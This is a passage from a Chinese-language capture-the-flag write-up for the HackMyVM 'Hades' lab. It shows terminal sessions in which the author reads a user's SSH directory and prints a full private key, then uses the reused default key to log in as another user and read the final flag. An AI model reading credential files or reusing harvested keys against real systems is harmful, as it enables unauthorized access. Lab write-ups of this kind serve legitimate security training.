/pwned/hera/flagz.txt
/pwned/hera/mission.txt
/pwned/hera/.profile
hera@hades:~$ cat /usr/hera
vzhOebSSplFoXPKxwtqU
```

但是没用上，直接ssh就连上去了，密码也不是这个。。。。
```bash
@hades:~$ ssh maria@0.0.0.0
The authenticity of host '0.0.0.0 (0.0.0.0)' can't be established.
ED25519 key fingerprint is SHA256:5QshhvvnibVTWOxgK9XbUejVSLahU6clfnK1Iku0wsg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Failed to add the host to the list of known hosts (/pwned/hera/.ssh/known_hosts).

                                                      .     **                                   
                                                   *           *.                                 
                                                                  ,*                              
                                                                     *,                            
                                             ,                         ,*                         
                                          .,                              *,                       
                                       /                                    *                    
                                    ,*                                        *,                  
                                 /.                                            .*.
                                                                _____
                __     __           _____         ____________      _____\    \            _____
                /  \   /  \        /      |_       \           \    /    / |    |      _____\    \
                /   /| |\   \      /         \       \           \  /    /  /___/|     /    / \    |
                /   //   \   \    |     /\    \       |    /\     ||    |__ |___|/    |    |  /___/|
                /    \_____/    \   |    |  |    \      |   |  |    ||       \       ____\    \ |   ||
                /    /\_____/\    \  |     \/      \     |    \/     ||     __/ __   /    /\    \|___|/
                /    //\_____/\    \ |\      /\     \   /           /||\    \  /  \ |    |/ \    \
                /____/ |       | \____\| \_____\ \_____\ /___________/ || \____\/    ||\____\ /____/|
                |    | |       | |    || |     | |     ||           | / | |    |____/|| |   ||    | |
                |____|/         \|____| \|_____|\|_____||___________|/   \|____|   | | \|___||____|/
                                                                        |___|/

                                       **                                    **.
                                          ,*                                **
                                             *,                          ,*
                                                *                      **
                                                *,                .*
                                                   *.           **
                                                      **      ,*,
                                                         ** *,
                                        [== HMVLabs Chapter 2: Hades ==]

                                         +===========================+
                                         |        Respect &          |
                                         |        Have fun!          |
                                         |                           |
                                         | https://hackmyvm.eu/hades |
                                         +===========================+


Linux hades 5.10.0-13-amd64 #1 SMP Debian 5.10.106-1 (2022-03-17) x86_64

                                                      .     **
                                                   *           *.
                                                                  ,*
                                                                     *,
                                             ,                         ,*
                                          .,                              *,
                                       /                                    *
                                    ,*                                        *,
                                 /.                                            .*.
                                                                _____
                __     __           _____         ____________      _____\    \            _____
                /  \   /  \        /      |_       \           \    /    / |    |      _____\    \
                /   /| |\   \      /         \       \           \  /    /  /___/|     /    / \    |
                /   //   \   \    |     /\    \       |    /\     ||    |__ |___|/    |    |  /___/|
                /    \_____/    \   |    |  |    \      |   |  |    ||       \       ____\    \ |   ||
                /    /\_____/\    \  |     \/      \     |    \/     ||     __/ __   /    /\    \|___|/
                /    //\_____/\    \ |\      /\     \   /           /||\    \  /  \ |    |/ \    \
                /____/ |       | \____\| \_____\ \_____\ /___________/ || \____\/    ||\____\ /____/|
                |    | |       | |    || |     | |     ||           | / | |    |____/|| |   ||    | |
                |____|/         \|____| \|_____|\|_____||___________|/   \|____|   | | \|___||____|/
                                                                        |___|/

                                       **                                    **.
                                          ,*                                **
                                             *,                          ,*
                                                *                      **
                                                *,                .*
                                                   *.           **
                                                      **      ,*,
                                                         ** *,
                                        [== HMVLabs Chapter 2: Hades ==]

                                         +===========================+
                                         |        Respect &          |
                                         |        Have fun!          |
                                         |                           |
                                         | https://hackmyvm.eu/hades |
                                         +===========================+


Last login: Tue Jul 16 10:13:03 2024 from 172.66.0.1
maria@hades:~$ vzhOebSSplFoXPKxwtqU
-bash: vzhOebSSplFoXPKxwtqU: command not found
maria@hades:~$ lss -la
-bash: lss: command not found
maria@hades:~$ ls -la
total 40
drwxr-x--- 3 root  maria 4096 Apr  5 06:36 .
drwxr-xr-x 1 root  root  4096 Apr  5 06:36 ..
-rw-r--r-- 1 maria maria  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 maria maria 3526 Apr 23  2023 .bashrc
-rw-r----- 1 root  maria   23 Apr  5 06:36 .loca1
-rw-r--r-- 1 maria maria  807 Apr 23  2023 .profile
drwxr-xr-x 2 root  root  4096 Apr  5 06:36 .ssh
-rw-r----- 1 root  maria  326 Apr  5 06:36 congrats.txt
-rw-r----- 1 root  maria   22 Apr  5 06:36 flagz.txt
```
原理其实是使用了默认的私钥进行了认证：

```bash
a@hades:~$ ls -la
total 40
drwxr-x--- 3 root hera 4096 Apr  5 06:36 .
drwxr-xr-x 1 root root 4096 Apr  5 06:36 ..
-rw-r----- 1 root hera  127 Apr  5 06:36 .bash_history
-rw-r--r-- 1 hera hera  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 hera hera 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 hera hera  807 Apr 23  2023 .profile
drwxr-xr-x 2 root root 4096 Apr  5 06:36 .ssh
-rw-r----- 1 root hera   22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root hera  182 Apr  5 06:36 mission.txt
hera@hades:~$ cd .ssh
hera@hades:~/.ssh$ ls -la
total 16
drwxr-xr-x 2 root root 4096 Apr  5 06:36 .
drwxr-x--- 3 root hera 4096 Apr  5 06:36 ..
-rw-r----- 1 root hera  568 Apr  5 06:36 authorized_keys
-rw-r----- 1 root hera 2590 Apr  5 06:36 id_rsa
hera@hades:~/.ssh$ cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHnkVd725zQHWzxW8JJFcTlmQRh2nQGEIiwsZo5dz+C99HqV9jwhryrJ6oucxjlwLatA5Fn270JFTdwHxaqFHQxHRHQBJoApbsVF3zpvhH5a+Y5GoDKToNDKU63pCMgZtdFKPC0+1Yr3D0TO
1ijaZya9ne9mnY20dFFVfGH2sye95C+uiDO1XPmhntqRkj74l6O6I5YqauCjEbb2G4WE5Qp1hw/D10Tul0gCCj9FT/Y4dSgFjzefRxT9JN1927NKmaNCuCfIs8vXeq6Z+wYzF+Obh6eFK4upLvG/P1w4fAyUZZb4LhtdFebhb1N3fjX9XbZtPR
010X8XMbzh6Q53iGifb9rgyFGcGGOTv0OQPCOtWsV+JvmCZR36wCbWE7t7UT9Mmt/zhnYzwhAoGbZX7WaieWS/W8kCvMzZzLbiq2mKOJ9obgFATvaKPc/8eValOhif1wFrbvvuQyAkuFkPMSFffjPxAU7U54L3DlypgTo3oS33X1pPvD8kfINZRcRSk= hera@hades.hmv
hera@hades:~/.ssh$ cat id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAx55FXe9uc0B1s8VvCSRXE5ZkEYdp0BhCIsLGaOXc/gvfR6lfY8Ia
8qyeqLnMY5cC2rQORZ9u9CRU3cB8WqhR0MR0R0ASaAKW7FRd86b4R+WvmORqAyk6DQylOt
6QjIGbXRSjwtPtWK9w9EztYo2mcmvZ3vZp2NtHRRVXxh9rMnveQvrogztVz5oZ7akZI++J
ejuiOWKmrgoxG29huFhOUKdYcPw9dE7pdIAgo/RU/2OHUoBY83n0cU/STdfduzSpmjQrgn
yLPL13qumfsGMxfjm4enhSuLqS7xvz9cOHwMlGWW+C4bXRXm4W9Td341/V22bT0dNdF/Fz
G84ekOd4hon2/a4MhRnBhjk79DkDwjrVrFfib5gmUd+sAm1hO7e1E/TJrf84Z2M8IQKBm2
V+1monlkv1vJArzM2cy24qtpijifaG4BQE72ij3P/HlWpToYn9cBa2777kMgJLhZDzEhX3
4z8QFO1OeC9w5cqYE6N6Et919aT7w/JHyDWUXEUpAAAFgCnyEcUp8hHFAAAAB3NzaC1yc2
EAAAGBAMeeRV3vbnNAdbPFbwkkVxOWZBGHadAYQiLCxmjl3P4L30epX2PCGvKsnqi5zGOX
Atq0DkWfbvQkVN3AfFqoUdDEdEdAEmgCluxUXfOm+Eflr5jkagMpOg0MpTrekIyBm10Uo8
LT7VivcPRM7WKNpnJr2d72adjbR0UVV8YfazJ73kL66IM7Vc+aGe2pGSPviXo7ojlipq4K
MRtvYbhYTlCnWHD8PXRO6XSAIKP0VP9jh1KAWPN59HFP0k3X3bs0qZo0K4J8izy9d6rpn7
BjMX45uHp4Uri6ku8b8/XDh8DJRllvguG10V5uFvU3d+Nf1dtm09HTXRfxcxvOHpDneIaJ
9v2uDIUZwYY5O/Q5A8I61axX4m+YJlHfrAJtYTu3tRP0ya3/OGdjPCECgZtlftZqJ5ZL9b
yQK8zNnMtuKraYo4n2huAUBO9oo9z/x5VqU6GJ/XAWtu++5DICS4WQ8xIV9+M/EBTtTngv
cOXKmBOjehLfdfWk+8PyR8g1lFxFKQAAAAMBAAEAAAGAfLX0wGsFphtvbZC7fgqmHCao/g
qLoOaG6xCkxIRXPKBOLocygTCThWky9ladytpdfiVfhT/GIeFQ4/mNt1XRR4x02M6+sRxt
DdjnmYGHO+PTgMGzOaZYDi8IS28g/6c5WT270cx1TCLPftFQvXGhu3qF8zYfisv0CsT6wV
x/rFqW0WHQQaygP8MWz9QFUN4mFaeMAi4P1Eupwmojsvf4dYsXRf9QpYlncNFbkxLix2t2
76Qf7n0Sqngj+14RuRN8h8bGJSfTS5oUI6rY/3+QcmACjp7Sm784HwZPmLTWig5MrIsVBq
Y35pmDO7YbIZ66Pi327dC/JwuBn1pVMuxsoUOl3mZdRCUuUFdCD3gyxMU88vHEBq+SU9rO
DxsNauBPkEqJk9E24ElkkdkJ0zzirrsrs4R0TbyJqVS80/Witt7nG9jxb5NWbtp6c1Utr2
O9fnVv2OF7xvpMk81hJFOCkfHZF2uWOFC9Ey6rH80VBS6VocF6cy3jTK1Mq9sqZMrBAAAA
wBjxlJnsFonnKdWvaYJ5oVWZINRghBOYBQe3TzpneHivPLevivVz3ABGxzKcPCP2qHVELo
8gxoMEVqkL+RSaVTM6xoVVYBNoN8bb2nUnXk8IZtFIYhnWzVqfQ4+VNFcDbWSE0SIG0my7
lOUyX6W7a5xWzo6TitAtKKRcKsbMTv3UuVDoyvOZPmFiReCKfsRA3KIWNT5OXA6anjON03
dZkhrBUWc6izs5z/4bVMFFMoV4cRgoSCQCqHZo7bklFWNjxAAAAMEA5nCSZXESZUVLyajK
q0oUa/gDPrFVnZm7Gln3TVHr96hcMNHUTAhPVWfWwg98MH+O5IjbTW03ZcTP/LoJV8Xy3O
WC9NY4lb7BEsja5sYA35g0xUKvQ0DaNdQeMEkZ4pLi3i17EbFtnDGlQxRe1nUPNgRtEx5z
fk9axW6yqPdUR8S0MufFW82VGjIXvEEXJD44NlXrjUGbBzK24q6VAkCBH1L5qiC/KfFBLO
W1gnTsS8AUjWF/0b4JL1D+HiVdWvq3AAAAwQDdwoK6606A87imIvD3VtaIGY+6N9M5Oodp
ICHg8Cml4nK+hqnFoE/V5UbFDgfBUfKM+XMXaJEwdQLkFKeY9U7BczB+0A1KrQS31LQK+/
Nl7792pZzcll2YT8THx91FDNi1dx0zmHRZv2oURDJMc0AJDTqSFSZ+X3t1bHs8qLckfR0X
O32JcoQ6JZUlJh+Okyq2A6lbEjQqPDk59NhQw/J24ryKHu5a4oIdfynXOofAqbTZrjQ8Qn
FdNGMEWYEiXx8AAAALdGVzdGVAZGViMTE=
-----END OPENSSH PRIVATE KEY-----

hgbe02@pwn:~/temp$ vim temp
hgbe02@pwn:~/temp$ chmod 600 temp
hgbe02@pwn:~/temp$ ssh-keygen -y -f temp > temp.pub
hgbe02@pwn:~/temp$ cat temp.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHnkVd725zQHWzxW8JJFcTlmQRh2nQGEIiwsZo5dz+C99HqV9jwhryrJ6oucxjlwLatA5Fn270JFTdwHxaqFHQxHRHQBJoApbsVF3zpvhH5a+Y5GoDKToNDKU63pCMgZtdFKPC0+1Yr3D0TO
1ijaZya9ne9mnY20dFFVfGH2sye95C+uiDO1XPmhntqRkj74l6O6I5YqauCjEbb2G4WE5Qp1hw/D10Tul0gCCj9FT/Y4dSgFjzefRxT9JN1927NKmaNCuCfIs8vXeq6Z+wYzF+Obh6eFK4upLvG/P1w4fAyUZZb4LhtdFebhb1N3fjX9XbZtPR
010X8XMbzh6Q53iGifb9rgyFGcGGOTv0OQPCOtWsV+JvmCZR36wCbWE7t7UT9Mmt/zhnYzwhAoGbZX7WaieWS/W8kCvMzZzLbiq2mKOJ9obgFATvaKPc/8eValOhif1wFrbvvuQyAkuFkPMSFffjPxAU7U54L3DlypgTo3oS33X1pPvD8kfINZRcRSk= teste@deb11
```


## final maria
```bash
maria@hades:~$ ls -la
total 40
drwxr-x--- 3 root  maria 4096 Apr  5 06:36 .
drwxr-xr-x 1 root  root  4096 Apr  5 06:36 ..
-rw-r--r-- 1 maria maria  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 maria maria 3526 Apr 23  2023 .bashrc
-rw-r----- 1 root  maria   23 Apr  5 06:36 .loca1
-rw-r--r-- 1 maria maria  807 Apr 23  2023 .profile
drwxr-xr-x 2 root  root  4096 Apr  5 06:36 .ssh
-rw-r----- 1 root  maria  326 Apr  5 06:36 congrats.txt
-rw-r----- 1 root  maria   22 Apr  5 06:36 flagz.txt
maria@hades:~$ cat congrats.txt 
################
#   CONGRATS   #
################

## EN ##
Congrats You did it!! If you like it or you have some ideas, just give us your feedback!! Or maybe this is not the last level?

## ES ##
Felicidades, lo conseguiste!! Si te ha gustado o tienes alguna idea recuerda darnos tu feedback!! O este no es el ultimo nivel?
maria@hades:~$ cat flagz.txt 
^zBKjbLoxNAQFKeouNnm^
```